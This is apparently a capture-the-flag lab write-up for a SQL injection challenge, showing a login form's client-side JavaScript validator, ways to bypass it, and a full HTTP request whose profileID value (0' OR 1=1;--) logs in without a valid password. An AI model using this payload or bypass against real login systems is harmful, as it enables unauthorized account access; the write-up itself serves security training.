# Challenge 3: URL Injection

![Pasted image 20210803163101](Pasted%20image%2020210803163101.png)

Just like challenges 1 and 2, this challenge is compromised of a login form prompting for a user ID and a password. Submission of the form results in an HTTP GET request being sent to the URI `/sesqli3/login` with the query parameters `profileID` and `password`.

However, before the form is submitted, it validates `profileID` and `password` **on the client side** with the following JavaScript function.

```javascript
function validateform() {
        var profileID = document.inputForm.profileID.value;
        var password = document.inputForm.password.value;

        if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
            alert("The input fields cannot contain special characters");
            return false;
        }
        if (profileID == null || password == null) {
            alert("The input fields cannot be empty.");
            return false;
        }
    }
```

Bypass this client-side validation by intercepting the request in BurpSuite or redefining the function to `function() {return true}` in the browser console.

The following injection authenticates.

```http
GET /sesqli3/login?profileID=0%27+OR+1%3D1%3B--&password=pass HTTP/1.1
Host: 10.10.240.237:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.240.237:5000/sesqli3/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```


![Pasted image 20210803171619](Pasted%20image%2020210803171619.png)
